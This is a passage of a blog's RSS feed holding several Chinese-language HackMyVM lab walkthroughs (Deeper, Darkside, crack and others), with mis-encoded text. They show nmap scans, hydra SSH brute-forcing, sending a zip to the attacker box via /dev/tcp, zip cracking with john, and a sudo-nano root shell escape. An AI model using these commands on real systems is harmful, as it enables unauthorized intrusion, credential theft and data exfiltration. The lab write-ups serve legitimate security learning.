â€‹`fzf`â€‹ æ˜¯ä¸€ä¸ªäº¤äº’å¼å‘½ä»¤è¡Œæ¨¡ç³ŠæŸ¥æ‰¾å·¥å…·ï¼Œå¹¶ä¸”å…¶ `--listen`â€‹ é€‰é¡¹å…è®¸å®ƒæ¥æ”¶æ¥è‡ªè¿œç¨‹è¿æ¥çš„å‘½ä»¤ã€‚</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_Doll.html</guid><pubDate>Thu, 20 Mar 2025 08:04:37 +0000</pubDate></item><item><title>hmv_Deeper</title><link>https://7r1UMPH.github.io/post/hmv_Deeper.html</link><description># hmv_Deeper

# 0.ç®€ä»‹

**é¶æœº**ï¼š[hackmyvm - Deeper](https://hackmyvm.eu/machines/machine.php?vm=Deeper)
**éš¾åº¦**ï¼šç»¿è‰²
**ç›®æ ‡ IP**ï¼š192.168.205.143
**æœ¬æœº IP**ï¼š192.168.205.141

# 1.æ‰«æ

`nmap`èµ·æ‰‹

```
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 16:34 CST
Nmap scan report for 192.168.205.143
Host is up (0.00046s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:49:23:DF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.54 seconds
```

# 2.è¸©ç‚¹

![Image](https://github.com/user-attachments/assets/91ecf9bd-ad4e-46cc-a738-92bfc7524a8b)

åŠ ä¸Š

![Image](https://github.com/user-attachments/assets/a2ee96a4-dce7-48ce-b94c-68125e7b3459)

![Image](https://github.com/user-attachments/assets/f7e4d481-8c35-47be-ba4d-88c63577b3c6)

![Image](https://github.com/user-attachments/assets/6ca74cb9-75f8-49fe-8abb-fb13d0bd5c02)

è§£ç ï¼ˆ[cyberchef](https://cyberchef.org/)ï¼‰

![Image](https://github.com/user-attachments/assets/5a25d1be-e84d-4793-948c-0a3678f8ceaa)

![Image](https://github.com/user-attachments/assets/c68825cd-5fbd-459d-aed3-0a45900572b1)

# 3.ææƒ

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ ssh alice@192.168.205.143                                             
The authenticity of host '192.168.205.143 (192.168.205.143)' can't be established.
ED25519 key fingerprint is SHA256:LsWOF4O2aDb/w6V7Z5VEAcjNfkxMmPOzyEIC7HMr91o.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.143' (ED25519) to the list of known hosts.
alice@192.168.205.143's password: 
Linux deeper 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Aug 26 00:38:16 2023 from 192.168.100.103
alice@deeper:~$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice)
alice@deeper:~$ sudo -l
[sudo] password for alice: 
Sorry, user alice may not run sudo on deeper.
alice@deeper:~$ ls -la
total 32
drwxr--r-- 3 alice alice 4096 Aug 26  2023 .
drwxr-xr-x 4 root  root  4096 Aug 25  2023 ..
lrwxrwxrwx 1 alice alice    9 Aug 25  2023 .bash_history -&gt; /dev/null
-rw-r--r-- 1 alice alice  220 Aug 25  2023 .bash_logout
-rw-r--r-- 1 alice alice 3526 Aug 25  2023 .bashrc
-rw-r--r-- 1 alice alice   41 Aug 25  2023 .bob.txt
drwxr-xr-x 3 alice alice 4096 Aug 26  2023 .local
-rw-r--r-- 1 alice alice  807 Aug 25  2023 .profile
-rw-r--r-- 1 alice alice   33 Aug 26  2023 user.txt
alice@deeper:~$ cat .bob.txt
535746745247566c634556756233566e61413d3d

```

![Image](https://github.com/user-attachments/assets/6cba623b-f063-4b85-93e5-72e751571700)

```bash
alice@deeper:/home$ su - bob
Password: 
bob@deeper:~$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
bob@deeper:~$ sudo -l
[sudo] password for bob: 
Sorry, user bob may not run sudo on deeper.
bob@deeper:~$ ls -la
total 28
drwxr--r-- 3 bob  bob  4096 Aug 26  2023 .
drwxr-xr-x 4 root root 4096 Aug 25  2023 ..
lrwxrwxrwx 1 bob  bob     9 Aug 25  2023 .bash_history -&gt; /dev/null
-rw-r--r-- 1 bob  bob   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 bob  bob  3526 Apr 23  2023 .bashrc
drwxr-xr-x 3 bob  bob  4096 Aug 25  2023 .local
-rw-r--r-- 1 bob  bob   807 Aug 25  2023 .profile
-rw-r--r-- 1 bob  bob   215 Aug 26  2023 root.zip
bob@deeper:~$ cat root.zip &gt; /dev/tcp/192.168.205.141/7777

#kali
â”Œâ”€â”€(kaliã‰¿kali)-[~/test/tmp]
â””â”€$ nc -lvnp 7777 &gt; root.zip 
listening on [any] 7777 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.143] 40706
                                                 
â”Œâ”€â”€(kaliã‰¿kali)-[~/test/tmp]
â””â”€$ zip2john root.zip &gt; hash                          
ver 1.0 efh 5455 efh 7875 root.zip/root.txt PKZIP Encr: 2b chk, TS_chk, cmplen=33, decmplen=21, crc=2D649941 ts=BA81 cs=ba81 type=0
                                                                                                                                   
â”Œâ”€â”€(kaliã‰¿kali)-[~/test/tmp]
â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
No password hashes left to crack (see FAQ)
                                                                                                                                   
â”Œâ”€â”€(kaliã‰¿kali)-[~/test/tmp]
â””â”€$ john --show hash                                  
root.zip/root.txt:bob:root.txt:root.zip::root.zip

1 password hash cracked, 0 left                                              
                                 
â”Œâ”€â”€(kaliã‰¿kali)-[~/test/tmp]
â””â”€$ unzip root.zip
Archive:  root.zip
[root.zip] root.txt password: 
 extracting: root.txt                                                                                                                                               
                                                                                                                                 
â”Œâ”€â”€(kaliã‰¿kali)-[~/test/tmp]
â””â”€$ cat root.txt
root:IhateMyPassword
                                
```

ç™»å½•root

```bash
bob@deeper:~$ su -
Password: 
root@deeper:~# id
uid=0(root) gid=0(root) groups=0(root)

```ã€‚</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_Deeper.html</guid><pubDate>Thu, 20 Mar 2025 08:03:36 +0000</pubDate></item><item><title>hmv_Darkside</title><link>https://7r1UMPH.github.io/post/hmv_Darkside.html</link><description># hmv_Darkside

# 0.ç®€ä»‹

**é¶æœº**ï¼š[hackmyvm - Darkside](https://hackmyvm.eu/machines/machine.php?vm=Darkside)
**éš¾åº¦**ï¼šç»¿è‰²
**ç›®æ ‡ IP**ï¼š192.168.205.134
**æœ¬æœº IP**ï¼š192.168.205.141

# 1.æ‰«æ

ä¸€å·ç”·å˜‰å®¾ï¼Œ`nmap`å¼€æ‰«

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.134
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-14 10:42 CST
Nmap scan report for 192.168.205.134
Host is up (0.00078s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:2D:1C:16 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.69 seconds                                                 
```

ä¼˜å…ˆæŸ¥çœ‹**httpæœåŠ¡**ç«¯å£ï¼Œ**sshç«¯å£**å¦‚æœæ²¡æœ‰è¿›å±•å†è¿›è¡Œçˆ†ç ´

# 2.è¸©ç‚¹

![image](https://github.com/user-attachments/assets/8432290e-d5d9-4863-9dfc-a43e9145b860)

æ˜¯ä¸ªç™»å½•é¡µï¼Œå°è¯•`sqlæ³¨å…¥ã€ä¸‡èƒ½å¯†ç ã€å¼±å¯†ç `å‡æ— æœï¼Œä½¿ç”¨`Nikto`è¿›è¡ŒWEBæ¼æ´æ‰«æ

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ nikto -h 192.168.205.134                       
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.205.134
+ Target Hostname:    192.168.205.134
+ Target Port:        80
+ Start Time:         2025-01-14 10:43:28 (GMT8)
---------------------------------------------------------------------------
+ Server: Apache/2.4.56 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /backup/: Directory indexing found.
+ /backup/: This might be interesting.
+ 8102 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2025-01-14 10:43:50 (GMT8) (22 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

æœ‰ä¸ªå¤‡ä»½ç›®å½•ï¼Œæˆ‘ä»¬å»ç½‘é¡µæŸ¥çœ‹ä¸€ä¸‹

![image](https://github.com/user-attachments/assets/8432290e-d5d9-4863-9dfc-a43e9145b860)

åªæœ‰ä¸€ä¸ª`vote.txt`æ–‡æœ¬æ–‡ä»¶ï¼Œç»™äº†æˆ‘ä»¬å‡ ä¸ªç”¨æˆ·åï¼Œæˆ‘ä»¬æ‹¿è¿™å‡ ä¸ªç”¨æˆ·åå»å°è¯•çˆ†ç ´sshæœåŠ¡

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ curl http://192.168.205.134/backup/vote.txt|awk -F ':' '{print $1}'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   205  100   205    0     0  69751      0 --:--:-- --:--:-- --:--:--  100k
rijaba
xerosec
sml
cromiphi
gatogamer
chema
talleyrand
d3b0o

Since the result was a draw, we will let you enter the darkside, or at least temporarily, good luck kevin.
                                                                                                                                     
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ vim user  
                                      
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ cat user
rijaba
xerosec
sml
cromiphi
gatogamer
chema
talleyrand
d3b0o
kevin
                  
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ hydra -L user -P /usr/share/wordlists/q5000.txt ssh://192.168.205.134 -I -u -f -e nsr -t 64 

Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-14 11:04:45
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 45027 login tries (l:9/p:5003), ~704 tries per task
[DATA] attacking ssh://192.168.205.134:22/

```

çˆ†ç ´çš„åŒæ—¶ï¼Œæˆ‘ä»¬ç”¨burpä¹Ÿçˆ†ç ´ç™»å½•é¡µ

![image](https://github.com/user-attachments/assets/b8ec81f2-f037-4bec-a27e-335aee5329d9)

é€‰è¿™ä¸ªï¼Œè®¾ç½®å¥½å‚æ•°åå¯åŠ¨çˆ†ç ´

![image](https://github.com/user-attachments/assets/f4a491ef-5970-4991-b5e2-83ae8de8d3c7)

æŒ‰ç…§é•¿åº¦æ’åºï¼Œå¯ä»¥å‘ç°è¯¥ç»„ç”¨æˆ·å¯†ç é•¿åº¦æ˜ç»†ä¸ä¸€æ ·ï¼Œå°è¯•ç™»å½•

![image](https://github.com/user-attachments/assets/c0b9156f-bbb0-475f-920a-7ed966e0a230)

è·å¾—äº†ä¸€ä¸²ç±»ä¼¼äºbase64çš„å­—ç¬¦ä¸²ï¼Œæ‹¿å»[cyberchef](https://cyberchef.org/)è§£å¯†

![image](https://github.com/user-attachments/assets/c0b9156f-bbb0-475f-920a-7ed966e0a230)

ï¼ˆå°´å°¬äº†ï¼Œæ˜¯base58ï¼‰è¾“å‡ºäº†ä¸€ä¸²å’Œç½‘å€å¾ˆåƒçš„å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬è®¿é—®ä¸€ä¸‹

![image](https://github.com/user-attachments/assets/1b02d153-2df9-4f83-a249-714cf8196a93)

é—®æˆ‘ä»¬é€‰å“ªè¾¹ï¼Œæˆ‘ä»¬æŸ¥çœ‹æºç 

![image](https://github.com/user-attachments/assets/fe152899-e95a-4487-a6a3-69c1bdc75f10)

ä»£ç æ˜¯å®ç°äº†å½“å­˜åœ¨åä¸º **side** çš„ **cookie** å¹¶ä¸”å®ƒçš„å€¼æ˜¯ `darkside`ï¼Œé‚£ä¹ˆè„šæœ¬å°†é‡å®šå‘ç”¨æˆ·åˆ° URL `hwvhysntovtanj.password`ï¼Œæˆ‘æ‡’å¾—æ”¹**cookie**äº†ï¼Œæˆ‘ä»¬ç›´æ¥è®¿é—®

![image](https://github.com/user-attachments/assets/9bc27d36-69e8-4d83-a178-f695a8e598ce)

è·å¾—äº†ä¸€ä¸ªè²Œä¼¼æ˜¯**sshæœåŠ¡**å¯†ç ï¼Œæˆ‘ä»¬å°è¯•ä¸€ä¸‹

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ ssh kevin@192.168.205.134  
The authenticity of host '192.168.205.134 (192.168.205.134)' can't be established.
ED25519 key fingerprint is SHA256:pmPw9d2/o54jN+Dmo29Hq6rIzWOQ//VhyZvK4KN6rmk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.134' (ED25519) to the list of known hosts.
kevin@192.168.205.134's password: 
Linux darkside 5.10.0-26-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Oct 15 15:18:15 2023 from 10.0.2.18
kevin@darkside:~$ id
uid=1000(kevin) gid=1000(kevin) groups=1000(kevin)
```

æˆåŠŸè¿æ¥

# 3.ææƒ

```bash
kevin@darkside:~$ sudo -l
[sudo] password for kevin: 
Sorry, user kevin may not run sudo on darkside.
kevin@darkside:~$ 
kevin@darkside:~$ ls -la
total 32
drwxr-xr-x 3 kevin kevin 4096 Oct 30  2023 .
drwxr-xr-x 4 root  root  4096 Oct 15  2023 ..
lrwxrwxrwx 1 kevin kevin    9 Oct 30  2023 .bash_history -&gt; /dev/null
-rw-r--r-- 1 kevin kevin  220 Oct 15  2023 .bash_logout
-rw-r--r-- 1 kevin kevin 3526 Oct 15  2023 .bashrc
-rw-r--r-- 1 kevin kevin  113 Oct 15  2023 .history
drwxr-xr-x 3 kevin kevin 4096 Oct 15  2023 .local
-rw-r--r-- 1 kevin kevin  807 Oct 15  2023 .profile
-rw-r--r-- 1 kevin kevin   19 Oct 15  2023 user.txt
kevin@darkside:~$ cat .history
ls -al
hostname -I
echo 'Congratulations on the OSCP Xerosec'
top
ps -faux
su rijaba
ILoveJabita
ls /home/rijaba

```

åœ¨å®¶ç›®å½•å‘ç°äº†`.history`æ–‡æœ¬æ–‡ä»¶ï¼ŒæŸ¥çœ‹è·å¾—äº†`rijaba`çš„å¯†ç ï¼Œå°è¯•ç™»å½•

```bash
kevin@darkside:~$ su rijaba
Password: 
rijaba@darkside:/home/kevin$ id
uid=1001(rijaba) gid=1001(rijaba) groups=1001(rijaba)
```

ç»§ç»­æµ‹è¯•ææƒ

```bash
rijaba@darkside:/home/kevin$ sudo -l
Matching Defaults entries for rijaba on darkside:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User rijaba may run the following commands on darkside:
    (root) NOPASSWD: /usr/bin/nano

```

å¯ä»¥ä½¿ç”¨**root**è¿è¡Œ`nano`ï¼Œæˆ‘ä»¬è¿›è¡Œææƒ

```bash
rijaba@darkside:/home/kevin$ sudo /usr/bin/nano
```

![image](https://github.com/user-attachments/assets/68590d1b-033a-440d-8aea-5eff83ad1d78)

è¿›å…¥`nano`æŒ‰**CTRL+R**ï¼Œ**CTRL+X**ï¼Œè¾“å…¥`reset; sh 1&gt;&amp;0 2&gt;&amp;0`å°±ææƒæˆåŠŸäº†

![image](https://github.com/user-attachments/assets/68590d1b-033a-440d-8aea-5eff83ad1d78)ã€‚</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_Darkside.html</guid><pubDate>Thu, 20 Mar 2025 08:02:34 +0000</pubDate></item><item><title>hmv_crack</title><link>https://7r1UMPH.github.io/post/hmv_crack.html</link><description># hmv_crack

# 0.ç®€ä»‹

**é¶æœº**ï¼š[hackmyvm - crack](https://hackmyvm.eu/machines/machine.php?vm=crack)
**éš¾åº¦**ï¼šç»¿è‰²
**ç›®æ ‡ IP**ï¼š192.168.205.143
**æœ¬æœº IP**ï¼š192.168.205.141

# 1.æ‰«æ

`nmap`èµ·æ‰‹

```
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-23 15:51 CST
Nmap scan report for 192.168.205.143
Host is up (0.00043s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
4200/tcp  open  vrml-multi-use
12359/tcp open  unknown
MAC Address: 08:00:27:75:33:75 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.46 seconds

```

`4000ã€12359`æ˜¯ä»€ä¹ˆç«¯å£æˆ‘ä»¬ä¸çŸ¥é“ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆçœ‹**ftp**ç«¯å£

# 2.è¸©ç‚¹

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ ftp 192.168.205.143                         
Connected to 192.168.205.143.
220 (vsFTPd 3.0.3)
Name (192.168.205.143:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls
229 Entering Extended Passive Mode (|||50526|)
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Jun 07  2023 upload
226 Directory send OK.
ftp&gt; cd upload
250 Directory successfully changed.
ftp&gt; ls
229 Entering Extended Passive Mode (|||30618|)
150 Here comes the directory listing.
-rwxr-xr-x    1 1000     1000          849 Jun 07  2023 crack.py
226 Directory send OK.
ftp&gt; mget crack.py
mget crack.py [anpqy?]? y
229 Entering Extended Passive Mode (|||35830|)
150 Opening BINARY mode data connection for crack.py (849 bytes).
100% |*****************************************************************************************|   849        1.71 MiB/s    00:00 ETA
226 Transfer complete.
849 bytes received in 00:00 (799.51 KiB/s)
ftp&gt; exit
221 Goodbye.
                                                                                                                                    
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ cat crack.py  
import os
import socket
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
port = 12359
s.bind(('', port))
s.listen(50)

c, addr = s.accept()
no = 'NO'
while True:
        try:
                c.send('File to read:'.encode())
                data = c.recv(1024)
                file = (str(data, 'utf-8').strip())
                filename = os.path.basename(file)
                check = '/srv/ftp/upload/'+filename
                if os.path.isfile(check) and os.path.isfile(file):
                        f = open(file,'r')
                        lines = f.readlines()
                        lines = str(lines)
                        lines = lines.encode()
                        c.send(lines)
                else:
                        c.send(no.encode())
        except ConnectionResetError:
                pass

```

å‘ç°äº†`12359`ç«¯å£çš„è¿è¡Œè„šæœ¬ï¼Œè„šæœ¬å®ç°æ–‡ä»¶è¯»å–æœåŠ¡ã€‚</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_crack.html</guid><pubDate>Thu, 20 Mar 2025 08:01:32 +0000</pubDate></item><item><title>hmv_CodeShield</title><link>https://7r1UMPH.github.io/post/hmv_CodeShield.html</link><description># hmv_CodeShield

# 0.ç®€ä»‹

**é¶æœº**ï¼š[hackmyvm - CodeShield](https://hackmyvm.eu/machines/machine.php?vm=CodeShield)
**éš¾åº¦**ï¼šç»¿è‰²
**ç›®æ ‡ IP**ï¼š192.168.205.138
**æœ¬æœº IP**ï¼š192.168.205.141

# 1.æ‰«æ

`nmap`èµ·æ‰‹

```
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ nmap -sS --min-rate 10000 -p- -Pn -sV 192.168.205.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 10:33 CST
Nmap scan report for 192.168.205.138
Host is up (0.046s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           vsftpd 3.0.5
80/tcp    open  http          nginx
110/tcp   open  pop3          Dovecot pop3d
143/tcp   open  imap          Dovecot imapd (Ubuntu)
443/tcp   open  ssl/http      nginx
993/tcp   open  imaps?
995/tcp   open  pop3s?
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
22222/tcp open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
MAC Address: 08:00:27:61:49:1F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.22 seconds
```

å…ˆæŠŠæˆ‘ä»¬æ„Ÿå…´è¶£çš„ç«¯å£æŒ‘å‡ºæ¥`21ã€80ã€443ã€22222`ï¼Œç°åœ¨å°±è¿™å‡ ä¸ªï¼Œåé¢æ²¡æœ‰å¤´ç»ªå†æŒ‘

# 2.è¸©ç‚¹

æˆ‘æ¯”è¾ƒå–œæ¬¢å…ˆçœ‹ftp21ç«¯å£ã€‚</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_CodeShield.html</guid><pubDate>Thu, 20 Mar 2025 08:00:30 +0000</pubDate></item><item><title>hmv_Chromatica</title><link>https://7r1UMPH.github.io/post/hmv_Chromatica.html</link><description># hmv_Chromatica

**é¶æœº**ï¼šhttps://hackmyvm.eu/machines/machine.php?vm\=Chromatica
**éš¾åº¦**ï¼šç»¿è‰²
**ç›®æ ‡ IP**ï¼š192.168.205.215
**æœ¬æœº** IPï¼š192.168.205.141

---

### **1. ç«¯å£æšä¸¾åŠæœåŠ¡æ¢æµ‹**

é¦–å…ˆï¼Œä½¿ç”¨ `nmap` æ‰«æç›®æ ‡ IP çš„å¼€æ”¾ç«¯å£ï¼š

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ nmap -sV -sT -O -Pn -n -p- 192.168.205.215
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-30 14:18 CST
Nmap scan report for 192.168.205.215
Host is up (0.0017s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
5353/tcp open  domain  dnsmasq 2.86
MAC Address: 08:00:27:95:39:FD (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.66 seconds
```

æ‰«æç»“æœæ˜¾ç¤ºç›®æ ‡æœºå™¨å¼€æ”¾äº† 22 (SSH) ã€ 80 (HTTP) ã€5353(DNS)ç«¯å£ã€‚</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_Chromatica.html</guid><pubDate>Thu, 20 Mar 2025 07:59:27 +0000</pubDate></item><item><title>hmv_canto</title><link>https://7r1UMPH.github.io/post/hmv_canto.html</link><description># hmv_canto

**é¶æœº**ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=canto
**éš¾åº¦**ï¼šç»¿è‰²
**ç›®æ ‡ IP**ï¼š192.168.205.213
**æœ¬æœº** IPï¼š192.168.205.141

---

### **1. ç«¯å£æšä¸¾åŠæœåŠ¡æ¢æµ‹**

é¦–å…ˆï¼Œä½¿ç”¨ `nmap` æ‰«æç›®æ ‡ IP çš„å¼€æ”¾ç«¯å£ï¼š

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nmap -sV -sT -O -Pn -n -p- 192.168.205.213
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 19:05 CST
Nmap scan report for 192.168.205.213
Host is up (0.00026s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.3p1 Ubuntu 1ubuntu3.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.57 ((Ubuntu))
MAC Address: 08:00:27:80:A9:92 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.13 seconds

```

æ‰«æç»“æœæ˜¾ç¤ºç›®æ ‡æœºå™¨å¼€æ”¾äº† 22 (SSH) å’Œ 80 (HTTP) ç«¯å£ã€‚</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_canto.html</guid><pubDate>Thu, 20 Mar 2025 07:58:25 +0000</pubDate></item><item><title>hmv_buster</title><link>https://7r1UMPH.github.io/post/hmv_buster.html</link><description># hmv_buster

# 0.ç®€ä»‹

**é¶æœº**ï¼š[hackmyvm - buster](https://hackmyvm.eu/machines/machine.php?vm=buster)
**éš¾åº¦**ï¼šç»¿è‰²
**ç›®æ ‡ IP**ï¼š192.168.205.142
**æœ¬æœº IP**ï¼š192.168.205.141

# 1.æ‰«æ

`nmap`èµ·æ‰‹

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.142
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-15 20:11 CST
Nmap scan report for 192.168.205.142
Host is up (0.00022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:09:D8:74 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds

```

å…ˆçœ‹**80ç«¯å£**ï¼Œ**22ç«¯å£**å€™è¡¥

# 2.è¸©ç‚¹

![image](https://github.com/user-attachments/assets/9eb492e1-d1d8-4170-bb5f-990d1792265b)
æ˜¯ä¸ª**wordPressï¼Œ**  æ‹¿**wpscan**æ‰«æä¸€ä¸‹

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ wpscan --url http://192.168.205.142/ -e vp,u --api-token xxx   #api-tokenæ³¨å†Œwpscanå®˜ç½‘è·å–
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ Â®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.205.142/ [192.168.205.142]
[+] Started: Wed Jan 15 20:13:50 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.14.2
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://192.168.205.142/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.205.142/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.205.142/readme.html
